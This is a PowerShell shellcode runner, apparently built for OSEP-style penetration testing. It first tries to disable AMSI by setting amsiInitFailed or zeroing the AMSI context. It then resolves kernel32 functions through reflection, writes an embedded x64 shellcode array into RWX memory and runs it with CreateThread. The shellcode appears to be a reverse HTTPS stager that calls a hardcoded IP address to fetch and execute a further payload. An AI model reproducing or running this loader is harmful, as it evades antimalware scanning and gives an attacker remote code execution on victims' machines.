
# =====================================================================
# OSEP-style Reflective Shellcode Runner (Diskless, No Add-Type)
# Fixed AMSI bypass + improved allocation + error handling
# Concise [DBG] messages added for visibility
# =====================================================================

# ────────────────────────────────────────────────────────────────
# Step 1: AMSI Bypass
# ────────────────────────────────────────────────────────────────
Write-Host "[DBG] Trying amsiInitFailed bypass..."
try {
    $AmsiUtils = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    $AmsiUtils.GetField('amsiInitFailed','NonPublic,Static').SetValue($null, $true)
    Write-Host "[+] AMSI bypass (initFailed) applied"
}
catch {
    Write-Host "[DBG] initFailed failed → fallback to context patch"
    try {
        $types = [Ref].Assembly.GetTypes()
        foreach ($type in $types) {
            if ($type.Name -like "*iUtils") { $AmsiUtils = $type; break }
        }
        $fields = $AmsiUtils.GetFields('NonPublic,Static')
        foreach ($field in $fields) {
            if ($field.Name -like "*Context") { $ctxField = $field; break }
        }
        $ctx = $ctxField.GetValue($null)
        
        if ($ctx -and $ctx -ne [IntPtr]::Zero) {
            [Byte[]]$zero = @(0,0,0,0,0,0,0,0)
            [System.Runtime.InteropServices.Marshal]::Copy($zero, 0, $ctx, 8)
            Write-Host "[+] AMSI context patched (8 bytes zeroed)"
        } else {
            Write-Host "[DBG] amsiContext null or not found"
        }
    }
    catch {
        Write-Host "[!] AMSI bypass failed completely"
    }
}

# ────────────────────────────────────────────────────────────────
# Step 2: Reflection-based Win32 API resolver
# ────────────────────────────────────────────────────────────────
function LookupFunc {
    Param (
        [Parameter(Mandatory = $true)] [string] $moduleName,
        [Parameter(Mandatory = $true)] [string] $functionName
    )

    Write-Host "[DBG] LookupFunc: resolving $functionName from $moduleName"
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
        Where-Object { $_.GlobalAssemblyCache -and $_.Location.Split('\\')[-1].Equals('System.dll') }).
        GetType('Microsoft.Win32.UnsafeNativeMethods')

    $getProc = $assem.GetMethods() | Where-Object { $_.Name -eq "GetProcAddress" } | Select-Object -First 1

    $hMod = $assem.GetMethod('GetModuleHandle').Invoke($null, @($moduleName))
    Write-Host "[DBG] GetModuleHandle($moduleName) → 0x$($hMod.ToString('X'))"

    $addr = $getProc.Invoke($null, @($hMod, $functionName))
    Write-Host "[DBG] GetProcAddress → 0x$($addr.ToString('X'))"
    return $addr
}

# ────────────────────────────────────────────────────────────────
# Step 3: Dynamic delegate creator
# ────────────────────────────────────────────────────────────────
function getDelegateType {
    Param (
        [Parameter(Mandatory=$true)] [Type[]] $parameters,
        [Parameter()] [Type] $returnType = [Void]
    )

    Write-Host "[DBG] Creating delegate type for params: $($parameters -join ', ')"
    $type = [AppDomain]::CurrentDomain.
        DefineDynamicAssembly((New-Object Reflection.AssemblyName('ReflDelegate')), 
            [Reflection.Emit.AssemblyBuilderAccess]::Run).
        DefineDynamicModule('InMemMod', $false).
        DefineType('MyDelegate','Class,Public,Sealed,AnsiClass,AutoClass',[MulticastDelegate])

    $type.DefineConstructor('RTSpecialName,HideBySig,Public',
        [Reflection.CallingConventions]::Standard, $parameters).
        SetImplementationFlags('Runtime,Managed')

    $type.DefineMethod('Invoke','Public,HideBySig,NewSlot,Virtual',
        $returnType, $parameters).
        SetImplementationFlags('Runtime,Managed')

    return $type.CreateType()
}

# ────────────────────────────────────────────────────────────────
# Step 4: Cache the important delegates
# ────────────────────────────────────────────────────────────────
$kernel32 = "kernel32.dll"

Write-Host "[DBG] Caching VirtualAlloc"
$VirtualAlloc = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupFunc $kernel32 "VirtualAlloc"),
    (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))
)

Write-Host "[DBG] Caching CreateThread"
$CreateThread = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupFunc $kernel32 "CreateThread"),
    (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))
)

Write-Host "[DBG] Caching WaitForSingleObject"
$WaitForSingleObject = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupFunc $kernel32 "WaitForSingleObject"),
    (getDelegateType @([IntPtr], [Int32]) ([Int32]))
)

# Optional: VirtualProtect delegate (uncomment if needed)
<#
Write-Host "[DBG] Caching VirtualProtect"
$VirtualProtect = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupFunc $kernel32 "VirtualProtect"),
    (getDelegateType @([IntPtr], [UInt32], [UInt32], [Ref][UInt32]) ([Bool]))
)
#>

# ────────────────────────────────────────────────────────────────
# Step 5: Your shellcode
# ────────────────────────────────────────────────────────────────
Write-Host "[DBG] Shellcode length: $($shellcode.Length) bytes"
[Byte[]]$shellcode = @(
    0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x0,0x0,0x0,0x41,0x51,0x41,0x50,0x52,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x51,0x56,0x48,0xf,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x8b,0x72,0x50,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x1,0xd0,0x66,0x81,0x78,0x18,0xb,0x2,0xf,0x85,0x72,0x0,0x0,0x0,0x8b,0x80,0x88,0x0,0x0,0x0,0x48,0x85,0xc0,0x74,0x67,0x48,0x1,0xd0,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x1,0xd0,0x50,0xe3,0x56,0x48,0xff,0xc9,0x4d,0x31,0xc9,0x41,0x8b,0x34,0x88,0x48,0x1,0xd6,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x3,0x4c,0x24,0x8,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x1,0xd0,0x66,0x41,0x8b,0xc,0x48,0x44,0x8b,0x40,0x1c,0x49,0x1,0xd0,0x41,0x8b,0x4,0x88,0x48,0x1,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x4b,0xff,0xff,0xff,0x5d,0x48,0x31,0xdb,0x53,0x49,0xbe,0x77,0x69,0x6e,0x69,0x6e,0x65,0x74,0x0,0x41,0x56,0x48,0x89,0xe1,0x49,0xc7,0xc2,0x4c,0x77,0x26,0x7,0xff,0xd5,0x53,0x53,0xe8,0x77,0x0,0x0,0x0,0x4d,0x6f,0x7a,0x69,0x6c,0x6c,0x61,0x2f,0x35,0x2e,0x30,0x20,0x28,0x4d,0x61,0x63,0x69,0x6e,0x74,0x6f,0x73,0x68,0x3b,0x20,0x49,0x6e,0x74,0x65,0x6c,0x20,0x4d,0x61,0x63,0x20,0x4f,0x53,0x20,0x58,0x20,0x31,0x34,0x5f,0x37,0x5f,0x32,0x29,0x20,0x41,0x70,0x70,0x6c,0x65,0x57,0x65,0x62,0x4b,0x69,0x74,0x2f,0x36,0x30,0x35,0x2e,0x31,0x2e,0x31,0x35,0x20,0x28,0x4b,0x48,0x54,0x4d,0x4c,0x2c,0x20,0x6c,0x69,0x6b,0x65,0x20,0x47,0x65,0x63,0x6b,0x6f,0x29,0x20,0x56,0x65,0x72,0x73,0x69,0x6f,0x6e,0x2f,0x31,0x37,0x2e,0x34,0x2e,0x31,0x20,0x53,0x61,0x66,0x61,0x72,0x69,0x2f,0x36,0x30,0x35,0x2e,0x31,0x2e,0x31,0x35,0x0,0x59,0x53,0x5a,0x4d,0x31,0xc0,0x4d,0x31,0xc9,0x53,0x53,0x49,0xba,0x3a,0x56,0x79,0xa7,0x0,0x0,0x0,0x0,0xff,0xd5,0xe8,0xf,0x0,0x0,0x0,0x31,0x39,0x32,0x2e,0x31,0x36,0x38,0x2e,0x34,0x35,0x2e,0x31,0x37,0x36,0x0,0x5a,0x48,0x89,0xc1,0x49,0xc7,0xc0,0xbb,0x1,0x0,0x0,0x4d,0x31,0xc9,0x53,0x53,0x6a,0x3,0x53,0x49,0xba,0x57,0x89,0x9f,0xc6,0x0,0x0,0x0,0x0,0xff,0xd5,0xe8,0x39,0x0,0x0,0x0,0x2f,0x30,0x45,0x31,0x6b,0x65,0x35,0x44,0x65,0x72,0x73,0x43,0x5f,0x77,0x4c,0x37,0x43,0x31,0x6c,0x73,0x71,0x77,0x77,0x5a,0x72,0x34,0x66,0x4f,0x74,0x4a,0x49,0x4f,0x62,0x52,0x54,0x6b,0x4c,0x68,0x45,0x51,0x30,0x32,0x59,0x6a,0x70,0x41,0x41,0x45,0x7a,0x4f,0x38,0x6c,0x33,0x47,0x64,0x66,0x0,0x48,0x89,0xc1,0x53,0x5a,0x41,0x58,0x4d,0x31,0xc9,0x53,0x48,0xb8,0x0,0x32,0xa8,0x84,0x0,0x0,0x0,0x0,0x50,0x53,0x53,0x49,0xc7,0xc2,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x48,0x89,0xc6,0x6a,0xa,0x5f,0x48,0x89,0xf1,0x6a,0x1f,0x5a,0x52,0x68,0x80,0x33,0x0,0x0,0x49,0x89,0xe0,0x6a,0x4,0x41,0x59,0x49,0xba,0x75,0x46,0x9e,0x86,0x0,0x0,0x0,0x0,0xff,0xd5,0x4d,0x31,0xc0,0x53,0x5a,0x48,0x89,0xf1,0x4d,0x31,0xc9,0x4d,0x31,0xc9,0x53,0x53,0x49,0xc7,0xc2,0x2d,0x6,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x1f,0x48,0xc7,0xc1,0x88,0x13,0x0,0x0,0x49,0xba,0x44,0xf0,0x35,0xe0,0x0,0x0,0x0,0x0,0xff,0xd5,0x48,0xff,0xcf,0x74,0x2,0xeb,0xaa,0xe8,0x55,0x0,0x0,0x0,0x53,0x59,0x6a,0x40,0x5a,0x49,0x89,0xd1,0xc1,0xe2,0x10,0x49,0xc7,0xc0,0x0,0x10,0x0,0x0,0x49,0xba,0x58,0xa4,0x53,0xe5,0x0,0x0,0x0,0x0,0xff,0xd5,0x48,0x93,0x53,0x53,0x48,0x89,0xe7,0x48,0x89,0xf1,0x48,0x89,0xda,0x49,0xc7,0xc0,0x0,0x20,0x0,0x0,0x49,0x89,0xf9,0x49,0xba,0x12,0x96,0x89,0xe2,0x0,0x0,0x0,0x0,0xff,0xd5,0x48,0x83,0xc4,0x20,0x85,0xc0,0x74,0xb2,0x66,0x8b,0x7,0x48,0x1,0xc3,0x85,0xc0,0x75,0xd2,0x58,0xc3,0x58,0x6a,0x0,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5
)

# ────────────────────────────────────────────────────────────────
# Step 6: Allocate memory
# ────────────────────────────────────────────────────────────────
Write-Host "[DBG] Shellcode size: $($shellcode.Length) bytes"
$pageSize = 0x1000
$allocSize = [Math]::Ceiling($shellcode.Length / $pageSize) * $pageSize
if ($allocSize -lt $pageSize) { $allocSize = $pageSize }
Write-Host "[DBG] Allocating $allocSize bytes (RWX)"

$lpMem = $VirtualAlloc.Invoke(
    [IntPtr]::Zero,
    $allocSize,
    0x3000,
    0x40
)

if ($lpMem -eq [IntPtr]::Zero) {
    Write-Error "VirtualAlloc failed (error code: $([Runtime.InteropServices.Marshal]::GetLastWin32Error()))"
    return
}

Write-Host "[+] Allocated RWX memory at 0x$($lpMem.ToString('X')) (size: $allocSize bytes)"

# ────────────────────────────────────────────────────────────────
# Step 7: Copy shellcode
# ────────────────────────────────────────────────────────────────
Write-Host "[DBG] Copying shellcode to 0x$($lpMem.ToString('X'))"
[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $lpMem, $shellcode.Length)
Write-Host "[+] Shellcode copied"

# Optional RX change
<#
Write-Host "[DBG] Changing protection to RX"
$oldProtect = 0
$VirtualProtect.Invoke($lpMem, $allocSize, 0x20, [ref]$oldProtect) | Out-Null
Write-Host "[+] Protection changed to RX"
#>

# ────────────────────────────────────────────────────────────────
# Step 8: Execute via thread
# ────────────────────────────────────────────────────────────────
Write-Host "[DBG] Creating thread at 0x$($lpMem.ToString('X'))"
$hThread = $CreateThread.Invoke(
    [IntPtr]::Zero,
    0,
    $lpMem,
    [IntPtr]::Zero,
    0,
    [IntPtr]::Zero
)

if ($hThread -eq [IntPtr]::Zero) {
    Write-Error "CreateThread failed (error code: $([Runtime.InteropServices.Marshal]::GetLastWin32Error()))"
    return
}

Write-Host "[+] Thread created (handle: $hThread). Executing..."

Write-Host "[DBG] Waiting for thread completion (INFINITE)"
$result = $WaitForSingleObject.Invoke($hThread, 0xFFFFFFFF)
Write-Host "[+] WaitForSingleObject returned: $result"
